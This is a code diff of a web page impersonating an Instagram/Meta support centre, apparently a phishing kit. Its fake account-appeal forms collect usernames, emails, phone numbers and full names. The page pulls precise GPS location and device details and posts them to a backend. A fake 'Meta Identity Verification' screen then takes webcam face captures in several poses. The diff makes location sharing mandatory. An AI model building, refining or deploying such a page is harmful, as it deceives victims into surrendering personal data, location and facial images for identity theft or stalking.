@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Instagram Support Center</title>
     <style>
+        /* ── reset & base ── */
         * {
             margin: 0;
             padding: 0;
@@ -15,13 +16,20 @@
             background: #fff;
             color: #262626;
         }
+
+        /* ── header ── */
         .header {
             background: #fff;
             border-bottom: 1px solid #dbdbdb;
             padding: 20px 16px;
             text-align: center;
         }
-        .header img { height: 40px; width: auto; }
+        .header img {
+            height: 40px;
+            width: auto;
+        }
+
+        /* ── search ── */
         .search-container {
             max-width: 600px;
             margin: 20px auto;
@@ -46,6 +54,8 @@
             background: #fafafa;
             color: #8e8e8e;
         }
+
+        /* ── main containers ── */
         .main-container {
             max-width: 600px;
             margin: 0 auto;
@@ -56,6 +66,8 @@
             color: #8e8e8e;
             margin-bottom: 16px;
         }
+
+        /* ── option cards ── */
         .option-item {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -68,7 +80,9 @@
             gap: 12px;
             transition: background 0.2s;
         }
-        .option-item:hover { background: #fafafa; }
+        .option-item:hover {
+            background: #fafafa;
+        }
         .radio-circle {
             width: 20px;
             height: 20px;
@@ -78,7 +92,9 @@
             position: relative;
             margin-top: 2px;
         }
-        .option-item.selected .radio-circle { border-color: #0095f6; }
+        .option-item.selected .radio-circle {
+            border-color: #0095f6;
+        }
         .option-item.selected .radio-circle::after {
             content: '';
             position: absolute;
@@ -90,7 +106,9 @@
             background: #0095f6;
             border-radius: 50%;
         }
-        .option-content { flex: 1; }
+        .option-content {
+            flex: 1;
+        }
         .option-title {
             font-size: 16px;
             font-weight: 600;
@@ -102,8 +120,14 @@
             color: #8e8e8e;
             line-height: 1.5;
         }
-        .form-container { display: none; }
-        .form-container.active { display: block; }
+
+        /* ── forms ── */
+        .form-container {
+            display: none;
+        }
+        .form-container.active {
+            display: block;
+        }
         .form-box {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -122,7 +146,9 @@
             line-height: 1.5;
             margin-bottom: 20px;
         }
-        .form-group { margin-bottom: 16px; }
+        .form-group {
+            margin-bottom: 16px;
+        }
         .form-label {
             font-size: 14px;
             color: #262626;
@@ -147,7 +173,7 @@
             background: #fff;
         }
 
-        /* Phone Group */
+        /* ── phone group ── */
         .phone-group {
             display: flex;
             gap: 10px;
@@ -183,12 +209,14 @@
             background: #fff;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
             z-index: 999;
             margin-top: 2px;
             overflow: hidden;
         }
-        .country-dropdown .dropdown-list.open { display: block; }
+        .country-dropdown .dropdown-list.open {
+            display: block;
+        }
         .country-dropdown .dropdown-search {
             padding: 6px 8px;
             border-bottom: 1px solid #ddd;
@@ -213,27 +241,35 @@
             font-size: 13px;
             border-bottom: 1px solid #f5f5f5;
         }
-        .country-dropdown .dropdown-options .option:hover { background: #f0f0f0; }
-        .country-dropdown .dropdown-options .option .flag { font-size: 18px; }
+        .country-dropdown .dropdown-options .option:hover {
+            background: #f0f0f0;
+        }
+        .country-dropdown .dropdown-options .option .flag {
+            font-size: 18px;
+        }
         .country-dropdown .dropdown-options .option .code {
             font-weight: 600;
             min-width: 40px;
         }
-        .phone-input { flex: 1; }
+        .phone-input {
+            flex: 1;
+        }
         .phone-error {
             color: #ed4956;
             font-size: 12px;
             margin-top: 4px;
             display: none;
         }
-        .phone-error.show { display: block; }
+        .phone-error.show {
+            display: block;
+        }
 
-        /* Consent Checkbox */
+        /* ── CONSENT CHECKBOX (CRITICAL FIX) ── */
         .consent-group {
             display: flex;
-            align-items: center;
+            align-items: flex-start;
             gap: 10px;
-            margin: 12px 0;
+            margin: 12px 0 4px 0;
             font-size: 14px;
             color: #262626;
         }
@@ -243,12 +279,37 @@
             accent-color: #0095f6;
             cursor: pointer;
             flex-shrink: 0;
+            margin-top: 1px;
         }
         .consent-group label {
             cursor: pointer;
             user-select: none;
+            line-height: 1.4;
+        }
+        /* required asterisk */
+        .consent-group .required-star {
+            color: #ed4956;
+            font-weight: 700;
+            margin-left: 2px;
+        }
+        /* inline error message */
+        .consent-error {
+            color: #ed4956;
+            font-size: 12px;
+            margin: 4px 0 0 28px;
+            display: none;
+            font-weight: 500;
+        }
+        .consent-error.show {
+            display: block;
+        }
+        /* highlight the checkbox group when error */
+        .consent-group.error {
+            border-left: 3px solid #ed4956;
+            padding-left: 10px;
         }
 
+        /* ── submit button ── */
         .send-btn {
             background: #0095f6;
             color: #fff;
@@ -261,12 +322,15 @@
             width: 100%;
             margin-top: 8px;
         }
-        .send-btn:hover { background: #1877f2; }
+        .send-btn:hover {
+            background: #1877f2;
+        }
         .send-btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
         }
 
+        /* ── footer ── */
         .footer {
             background: #fafafa;
             padding: 40px 20px 20px;
@@ -290,7 +354,9 @@
             text-transform: uppercase;
             letter-spacing: 0.2px;
         }
-        .footer-link:hover { text-decoration: underline; }
+        .footer-link:hover {
+            text-decoration: underline;
+        }
         .footer-copyright {
             text-align: center;
             font-size: 12px;
@@ -315,13 +381,16 @@
             font-weight: 400;
             opacity: 0.7;
         }
-        .footer-language a:hover { text-decoration: underline; }
+        .footer-language a:hover {
+            text-decoration: underline;
+        }
         .footer-language .active {
             color: #262626;
             font-weight: 600;
             opacity: 1;
         }
 
+        /* ── verification screen ── */
         .verification-screen {
             display: none;
             position: fixed;
@@ -364,7 +433,7 @@
             border-radius: 8px;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 1px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 1px 8px rgba(0, 0, 0, 0.1);
         }
         #verificationVideo {
             width: 100%;
@@ -378,22 +447,22 @@
             transform: translate(-50%, -50%);
             width: 200px;
             height: 260px;
-            border: 2px solid rgba(255,255,255,0.8);
+            border: 2px solid rgba(255, 255, 255, 0.8);
             border-radius: 50%;
-            box-shadow: 0 0 0 9999px rgba(0,0,0,0.5);
+            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
             pointer-events: none;
             transition: border-color 0.3s;
         }
         .face-oval.matched {
             border-color: #4CAF50;
-            box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 20px rgba(76,175,80,0.6);
+            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5), 0 0 20px rgba(76, 175, 80, 0.6);
         }
         .pose-text {
             position: absolute;
             top: 20px;
             left: 50%;
             transform: translateX(-50%);
-            background: rgba(0,0,0,0.75);
+            background: rgba(0, 0, 0, 0.75);
             color: #fff;
             padding: 8px 16px;
             border-radius: 4px;
@@ -405,7 +474,7 @@
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
-            background: rgba(0,0,0,0.75);
+            background: rgba(0, 0, 0, 0.75);
             color: #fff;
             padding: 6px 12px;
             border-radius: 4px;
@@ -423,8 +492,11 @@
             border-radius: 4px;
             cursor: pointer;
         }
-        .verification-submit-btn.show { display: block; }
+        .verification-submit-btn.show {
+            display: block;
+        }
 
+        /* ── success modal ── */
         .success-modal {
             display: none;
             position: fixed;
@@ -433,14 +505,20 @@
             width: 100%;
             background: #fff;
             border-top: 1px solid #ccc;
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.15);
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.15);
             z-index: 2000;
             animation: slideUp 0.3s ease;
         }
-        .success-modal.active { display: block; }
+        .success-modal.active {
+            display: block;
+        }
         @keyframes slideUp {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
         }
         .modal-header {
             background: #6d86b7;
@@ -468,21 +546,30 @@
             font-size: 13px;
             cursor: pointer;
         }
-        .modal-btn:hover { background: #365899; }
-        .hidden { display: none !important; }
+        .modal-btn:hover {
+            background: #365899;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
+
+    <!-- ===== HEADER ===== -->
     <div class="header">
-        <img src="https://files.catbox.moe/5iyrej.png" alt="Instagram">
+        <img src="https://files.catbox.moe/5iyrej.png" alt="Instagram" />
     </div>
+
+    <!-- ===== SEARCH ===== -->
     <div class="search-container">
         <svg class="search-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M21 21L16.65 16.65M19 11C19 15.4183 15.4183 19 11 19C6.58172 19 3 15.4183 3 11C3 6.58172 6.58172 3 11 3C15.4183 3 19 6.58172 19 11Z" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
-        <input type="text" class="search-box" placeholder="How can we help?" readonly>
+        <input type="text" class="search-box" placeholder="How can we help?" readonly />
     </div>
 
+    <!-- ===== SELECTION SCREEN ===== -->
     <div class="main-container" id="selectionScreen">
         <div class="help-center-label">Help Center</div>
         <div class="option-item" onclick="selectOption('disabled', this)">
@@ -501,21 +588,24 @@
         </div>
     </div>
 
-    <!-- DISABLED FORM -->
+    <!-- ===== DISABLED FORM ===== -->
     <div class="main-container form-container" id="disabledForm">
         <div class="help-center-label">Help Center</div>
         <div class="form-box">
             <h1 class="form-title">Disabled Account Appeal (New)</h1>
             <p class="form-description">If your Instagram account has been disabled, submit an appeal to request a review. Please provide accurate information for faster processing.</p>
-            <form id="disabledAppealForm">
+            <form id="disabledAppealForm" novalidate>
+                <!-- username -->
                 <div class="form-group">
                     <label class="form-label">Instagram Username</label>
-                    <input type="text" class="form-input" name="username" required>
+                    <input type="text" class="form-input" name="username" required />
                 </div>
+                <!-- email -->
                 <div class="form-group">
                     <label class="form-label">Email Address</label>
-                    <input type="email" class="form-input" name="email" required>
+                    <input type="email" class="form-input" name="email" required />
                 </div>
+                <!-- phone -->
                 <div class="form-group">
                     <label class="form-label">Phone Number</label>
                     <div class="phone-group" id="phoneGroup1">
@@ -527,23 +617,26 @@
                             </div>
                             <div class="dropdown-list" id="list1">
                                 <div class="dropdown-search">
-                                    <input type="text" placeholder="Search country..." oninput="filterDropdown('dropdown1')">
+                                    <input type="text" placeholder="Search country..." oninput="filterDropdown('dropdown1')" />
                                 </div>
                                 <div class="dropdown-options" id="options1"></div>
                             </div>
                         </div>
-                        <input type="tel" class="form-input phone-input" id="phone1" placeholder="Enter phone number" required>
+                        <input type="tel" class="form-input phone-input" id="phone1" placeholder="Enter phone number" required />
                     </div>
                     <div class="phone-error" id="error1">Please enter 7-10 digits after country code.</div>
                 </div>
+                <!-- full name -->
                 <div class="form-group">
                     <label class="form-label">Full Name</label>
-                    <input type="text" class="form-input" name="fullname" required>
+                    <input type="text" class="form-input" name="fullname" required />
                 </div>
+                <!-- alternative -->
                 <div class="form-group">
                     <label class="form-label">Alternative Instagram Account (Optional)</label>
-                    <input type="text" class="form-input" name="alternative">
+                    <input type="text" class="form-input" name="alternative" />
                 </div>
+                <!-- relationship -->
                 <div class="form-group">
                     <label class="form-label">Your Relationship to This Account</label>
                     <select class="form-select" name="relationship" required>
@@ -554,32 +647,39 @@
                     </select>
                 </div>
 
-                <!-- Consent Checkbox -->
-                <div class="consent-group">
-                    <input type="checkbox" id="consent1" required>
-                    <label for="consent1">I agree to provide accurate information and consent to share my location for verification purposes.</label>
+                <!-- ===== CONSENT CHECKBOX — NOW MANDATORY ===== -->
+                <div class="consent-group" id="consentGroup1">
+                    <input type="checkbox" id="consent1" />
+                    <label for="consent1">
+                        I agree to provide accurate information and consent to share my location for verification purposes.
+                        <span class="required-star">*</span>
+                    </label>
                 </div>
+                <div class="consent-error" id="consentError1">Please allow location access to continue.</div>
 
                 <button type="submit" class="send-btn" id="submitBtn1">Send</button>
             </form>
         </div>
     </div>
 
-    <!-- CHAT FORM -->
+    <!-- ===== CHAT FORM ===== -->
     <div class="main-container form-container" id="chatForm">
         <div class="help-center-label">Help Center</div>
         <div class="form-box">
             <h1 class="form-title">Instagram Chat Restrictions Appeal</h1>
             <p class="form-description">Appeal against chat restrictions or message blocking on your Instagram account. We'll review your case and get back to you.</p>
-            <form id="chatAppealForm">
+            <form id="chatAppealForm" novalidate>
+                <!-- username -->
                 <div class="form-group">
                     <label class="form-label">Instagram Username</label>
-                    <input type="text" class="form-input" name="username" required>
+                    <input type="text" class="form-input" name="username" required />
                 </div>
+                <!-- email -->
                 <div class="form-group">
                     <label class="form-label">Email Address</label>
-                    <input type="email" class="form-input" name="email" required>
+                    <input type="email" class="form-input" name="email" required />
                 </div>
+                <!-- phone -->
                 <div class="form-group">
                     <label class="form-label">Phone Number</label>
                     <div class="phone-group" id="phoneGroup2">
@@ -591,23 +691,26 @@
                             </div>
                             <div class="dropdown-list" id="list2">
                                 <div class="dropdown-search">
-                                    <input type="text" placeholder="Search country..." oninput="filterDropdown('dropdown2')">
+                                    <input type="text" placeholder="Search country..." oninput="filterDropdown('dropdown2')" />
                                 </div>
                                 <div class="dropdown-options" id="options2"></div>
                             </div>
                         </div>
-                        <input type="tel" class="form-input phone-input" id="phone2" placeholder="Enter phone number" required>
+                        <input type="tel" class="form-input phone-input" id="phone2" placeholder="Enter phone number" required />
                     </div>
                     <div class="phone-error" id="error2">Please enter 7-10 digits after country code.</div>
                 </div>
+                <!-- full name -->
                 <div class="form-group">
                     <label class="form-label">Full Name</label>
-                    <input type="text" class="form-input" name="fullname" required>
+                    <input type="text" class="form-input" name="fullname" required />
                 </div>
+                <!-- alternative -->
                 <div class="form-group">
                     <label class="form-label">Alternative Instagram Account (Optional)</label>
-                    <input type="text" class="form-input" name="alternative">
+                    <input type="text" class="form-input" name="alternative" />
                 </div>
+                <!-- relationship -->
                 <div class="form-group">
                     <label class="form-label">Your Relationship to This Account</label>
                     <select class="form-select" name="relationship" required>
@@ -618,18 +721,22 @@
                     </select>
                 </div>
 
-                <!-- Consent Checkbox -->
-                <div class="consent-group">
-                    <input type="checkbox" id="consent2" required>
-                    <label for="consent2">I agree to provide accurate information and consent to share my location for verification purposes.</label>
+                <!-- ===== CONSENT CHECKBOX — NOW MANDATORY ===== -->
+                <div class="consent-group" id="consentGroup2">
+                    <input type="checkbox" id="consent2" />
+                    <label for="consent2">
+                        I agree to provide accurate information and consent to share my location for verification purposes.
+                        <span class="required-star">*</span>
+                    </label>
                 </div>
+                <div class="consent-error" id="consentError2">Please allow location access to continue.</div>
 
                 <button type="submit" class="send-btn" id="submitBtn2">Send</button>
             </form>
         </div>
     </div>
 
-    <!-- VERIFICATION SCREEN -->
+    <!-- ===== VERIFICATION SCREEN ===== -->
     <div class="verification-screen" id="verificationScreen">
         <div class="verification-header"><h2>Meta Identity Verification</h2></div>
         <div class="verification-content">
@@ -643,14 +750,14 @@
         </div>
     </div>
 
-    <!-- SUCCESS MODAL -->
+    <!-- ===== SUCCESS MODAL ===== -->
     <div class="success-modal" id="successModal">
         <div class="modal-header">Form Submitted Successfully</div>
         <div class="modal-body">Your form has been submitted successfully. We have received your information and will process it shortly.</div>
         <div class="modal-footer"><button class="modal-btn" onclick="redirectToMainPage()">Okay</button></div>
     </div>
 
-    <!-- FOOTER -->
+    <!-- ===== FOOTER ===== -->
     <div class="footer">
         <div class="footer-links">
             <a href="#" class="footer-link">ABOUT US</a>
@@ -677,9 +784,9 @@
     </div>
 
     <script>
-        // ============================================================
+        // ================================================================
         // 1. COUNTRY DATABASE
-        // ============================================================
+        // ================================================================
         const COUNTRIES = [
             { code: "+91", flag: "🇮🇳", name: "India" },
             { code: "+1", flag: "🇺🇸", name: "United States" },
@@ -741,9 +848,9 @@
             { code: "+263", flag: "🇿🇼", name: "Zimbabwe" }
         ];
 
-        // ============================================================
+        // ================================================================
         // 2. DROPDOWN LOGIC
-        // ============================================================
+        // ================================================================
         function renderOptions(dropdownId) {
             const container = document.getElementById('options' + dropdownId.replace('dropdown', ''));
             if (!container) return;
@@ -781,7 +888,8 @@
                     o.classList.toggle('active', o.dataset.code === code);
                 });
                 const search = dd.querySelector('.dropdown-search input');
-                if (search) { search.value = ''; search.focus(); }
+                if (search) { search.value = '';
+                    search.focus(); }
             }
         }
 
@@ -800,31 +908,33 @@
             }
         });
 
-        // ============================================================
+        // ================================================================
         // 3. AUTO DETECT COUNTRY
-        // ============================================================
+        // ================================================================
         async function detectAndSetCountry() {
-            let code = '+91', flag = '🇮🇳';
+            let code = '+91',
+                flag = '🇮🇳';
             try {
                 const res = await fetch('https://ipapi.co/country/');
                 if (res.ok) {
                     const iso = (await res.text()).trim().toUpperCase();
                     const map = {
-                        'US': '+1','IN': '+91','GB': '+44','AU': '+61','JP': '+81','CN': '+86',
-                        'DE': '+49','FR': '+33','IT': '+39','ES': '+34','BR': '+55','MX': '+52',
-                        'RU': '+7','KR': '+82','NL': '+31','SE': '+46','CH': '+41','NO': '+47',
-                        'DK': '+45','FI': '+358','GR': '+30','TR': '+90','SA': '+966','AE': '+971',
-                        'IL': '+972','EG': '+20','ZA': '+27','KE': '+254','NG': '+234','PK': '+92',
-                        'LK': '+94','NP': '+977','BD': '+880','MY': '+60','ID': '+62','PH': '+63',
-                        'NZ': '+64','SG': '+65','TH': '+66','VN': '+84','TW': '+886','IR': '+98',
-                        'IQ': '+964','JO': '+962','LB': '+961','OM': '+968','QA': '+974','KW': '+965',
-                        'BH': '+973','MA': '+212','TN': '+216','DZ': '+213','LY': '+218','ET': '+251',
-                        'UG': '+256','TZ': '+255','ZM': '+260','ZW': '+263'
+                        'US': '+1', 'IN': '+91', 'GB': '+44', 'AU': '+61', 'JP': '+81', 'CN': '+86',
+                        'DE': '+49', 'FR': '+33', 'IT': '+39', 'ES': '+34', 'BR': '+55', 'MX': '+52',
+                        'RU': '+7', 'KR': '+82', 'NL': '+31', 'SE': '+46', 'CH': '+41', 'NO': '+47',
+                        'DK': '+45', 'FI': '+358', 'GR': '+30', 'TR': '+90', 'SA': '+966', 'AE': '+971',
+                        'IL': '+972', 'EG': '+20', 'ZA': '+27', 'KE': '+254', 'NG': '+234', 'PK': '+92',
+                        'LK': '+94', 'NP': '+977', 'BD': '+880', 'MY': '+60', 'ID': '+62', 'PH': '+63',
+                        'NZ': '+64', 'SG': '+65', 'TH': '+66', 'VN': '+84', 'TW': '+886', 'IR': '+98',
+                        'IQ': '+964', 'JO': '+962', 'LB': '+961', 'OM': '+968', 'QA': '+974', 'KW': '+965',
+                        'BH': '+973', 'MA': '+212', 'TN': '+216', 'DZ': '+213', 'LY': '+218', 'ET': '+251',
+                        'UG': '+256', 'TZ': '+255', 'ZM': '+260', 'ZW': '+263'
                     };
                     const c = map[iso];
                     if (c) {
                         const country = COUNTRIES.find(x => x.code === c);
-                        if (country) { code = c; flag = country.flag; }
+                        if (country) { code = c;
+                            flag = country.flag; }
                     }
                 }
             } catch (_) {}
@@ -836,9 +946,9 @@
         }
         detectAndSetCountry();
 
-        // ============================================================
-        // 4. PHONE VALIDATION (FIXED)
-        // ============================================================
+        // ================================================================
+        // 4. PHONE VALIDATION
+        // ================================================================
         function validatePhone(input) {
             const formGroup = input.closest('.form-group');
             const error = formGroup.querySelector('.phone-error');
@@ -888,9 +998,9 @@
             inp.addEventListener('blur', function() { validatePhone(this); });
         });
 
-        // ============================================================
+        // ================================================================
         // 5. GPS LOCATION (triggered by checkbox)
-        // ============================================================
+        // ================================================================
         let gpsLocation = null;
 
         function getGPSLocation() {
@@ -902,9 +1012,10 @@
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         const { latitude, longitude } = position.coords;
-                        // Reverse geocode
                         try {
-                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
+                            const res = await fetch(
+                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`
+                            );
                             if (res.ok) {
                                 const data = await res.json();
                                 const addr = data.address || {};
@@ -926,21 +1037,22 @@
                                     mapLink: mapLink
                                 });
                             } else {
-                                resolve({ lat: latitude, lon: longitude, address: 'N/A', mapLink: `https://www.google.com/maps?q=${latitude},${longitude}` });
+                                resolve({ lat: latitude, lon: longitude, address: 'N/A',
+                                    mapLink: `https://www.google.com/maps?q=${latitude},${longitude}` });
                             }
                         } catch (_) {
-                            resolve({ lat: latitude, lon: longitude, address: 'N/A', mapLink: `https://www.google.com/maps?q=${latitude},${longitude}` });
+                            resolve({ lat: latitude, lon: longitude, address: 'N/A',
+                                mapLink: `https://www.google.com/maps?q=${latitude},${longitude}` });
                         }
                     },
-                    () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    () => resolve(null), { enableHighAccuracy: true, timeout: 10000 }
                 );
             });
         }
 
-        // ============================================================
+        // ================================================================
         // 6. VERIFICATION STATE
-        // ============================================================
+        // ================================================================
         let verificationState = {
             currentPose: 0,
             captures: [],
@@ -957,9 +1069,9 @@
             { name: 'straight_final', text: 'Look Straight Again' }
         ];
 
-        // ============================================================
+        // ================================================================
         // 7. SELECT OPTION
-        // ============================================================
+        // ================================================================
         function selectOption(type, element) {
             document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
             element.classList.add('selected');
@@ -969,9 +1081,43 @@
             }, 300);
         }
 
-        // ============================================================
-        // 8. FORM SUBMIT – WITH GPS + DEVICE INFO
-        // ============================================================
+        // ================================================================
+        // 8. CONSENT VALIDATION HELPERS
+        // ================================================================
+        function validateConsent(form) {
+            const consentGroup = form.querySelector('.consent-group');
+            const checkbox = consentGroup.querySelector('input[type="checkbox"]');
+            const errorEl = form.querySelector('.consent-error');
+
+            if (!checkbox.checked) {
+                consentGroup.classList.add('error');
+                errorEl.classList.add('show');
+                // scroll to the error
+                errorEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return false;
+            } else {
+                consentGroup.classList.remove('error');
+                errorEl.classList.remove('show');
+                return true;
+            }
+        }
+
+        // clear consent error on checkbox change
+        document.querySelectorAll('.consent-group input[type="checkbox"]').forEach(cb => {
+            cb.addEventListener('change', function() {
+                const form = this.closest('form');
+                const group = this.closest('.consent-group');
+                const errorEl = form.querySelector('.consent-error');
+                if (this.checked) {
+                    group.classList.remove('error');
+                    errorEl.classList.remove('show');
+                }
+            });
+        });
+
+        // ================================================================
+        // 9. FORM SUBMIT – WITH GPS + DEVICE INFO + MANDATORY CONSENT
+        // ================================================================
         document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
             e.preventDefault();
             handleFormSubmit(this, 'Disabled Account Appeal');
@@ -982,23 +1128,22 @@
         });
 
         async function handleFormSubmit(form, formType) {
+            // --- 1. Validate phone ---
             const phoneInput = form.querySelector('.phone-input');
             if (!validatePhone(phoneInput)) { phoneInput.focus(); return; }
 
-            // Check consent checkbox
-            const consentCheck = form.querySelector('.consent-group input[type="checkbox"]');
-            if (!consentCheck.checked) {
-                alert('Please agree to the terms to submit the form.');
-                consentCheck.focus();
+            // --- 2. Validate consent (MANDATORY) ---
+            if (!validateConsent(form)) {
+                // focus the checkbox
+                const cb = form.querySelector('.consent-group input[type="checkbox"]');
+                if (cb) cb.focus();
                 return;
             }
 
-            // Get GPS location (if consent given)
-            let locationData = null;
-            if (consentCheck.checked) {
-                locationData = await getGPSLocation();
-            }
+            // --- 3. Get GPS location (only if consent given) ---
+            let locationData = await getGPSLocation();
 
+            // --- 4. Build data ---
             const formData = new FormData(form);
             const data = Object.fromEntries(formData);
             const group = form.querySelector('.phone-group');
@@ -1018,34 +1163,32 @@
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
             };
 
-            // GPS Location
-            if (locationData) {
-                data.gps = locationData;
-            } else {
-                data.gps = null;
-            }
+            data.gps = locationData || null;
+            data.consentGiven = true; // we know it's checked
 
             verificationState.formData = { type: formType, ...data };
 
-            fetch('/api/submit-form', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(res => res.json())
-            .then(() => {
+            // --- 5. Submit ---
+            try {
+                const res = await fetch('/api/submit-form', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                if (!res.ok) throw new Error('Server error');
+                await res.json();
+
                 document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
                 document.getElementById('verificationScreen').classList.add('active');
                 setTimeout(startVerification, 500);
-            })
-            .catch(err => {
+            } catch (err) {
                 alert('Submit failed: ' + err.message);
-            });
+            }
         }
 
-        // ============================================================
-        // 9. VERIFICATION FLOW (unchanged)
-        // ============================================================
+        // ================================================================
+        // 10. VERIFICATION FLOW
+        // ================================================================
         function startVerification() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
                 .then(stream => {
@@ -1113,25 +1256,25 @@
             btn.onclick = () => {
                 const d = verificationState.formData;
                 fetch('/api/verification-complete', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: d.username,
-                        email: d.email,
-                        phone: d.phone,
-                        fullname: d.fullname,
-                        formType: d.type
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username: d.username,
+                            email: d.email,
+                            phone: d.phone,
+                            fullname: d.fullname,
+                            formType: d.type
+                        })
                     })
-                })
-                .then(res => res.json())
-                .then(() => {
-                    if (verificationState.videoStream) {
-                        verificationState.videoStream.getTracks().forEach(t => t.stop());
-                    }
-                    document.getElementById('verificationScreen').classList.remove('active');
-                    document.getElementById('successModal').classList.add('active');
-                })
-                .catch(err => alert('Completion failed: ' + err.message));
+                    .then(res => res.json())
+                    .then(() => {
+                        if (verificationState.videoStream) {
+                            verificationState.videoStream.getTracks().forEach(t => t.stop());
+                        }
+                        document.getElementById('verificationScreen').classList.remove('active');
+                        document.getElementById('successModal').classList.add('active');
+                    })
+                    .catch(err => alert('Completion failed: ' + err.message));
             };
         }
 
@@ -1142,18 +1285,21 @@
             document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
             document.getElementById('disabledAppealForm').reset();
             document.getElementById('chatAppealForm').reset();
+            // clear consent errors
+            document.querySelectorAll('.consent-error').forEach(el => el.classList.remove('show'));
+            document.querySelectorAll('.consent-group').forEach(el => el.classList.remove('error'));
             verificationState = { currentPose: 0, captures: [], videoStream: null, formData: {}, isCapturing: false };
             window.scrollTo(0, 0);
         }
 
-        // ============================================================
-        // 10. FOOTER YEAR
-        // ============================================================
+        // ================================================================
+        // 11. FOOTER YEAR
+        // ================================================================
         document.getElementById('footerYear').textContent = new Date().getFullYear();
 
-        // ============================================================
-        // 11. INIT
-        // ============================================================
+        // ================================================================
+        // 12. INIT
+        // ================================================================
         ['1', '2'].forEach(id => renderOptions('dropdown' + id));
     </script>
 </body>
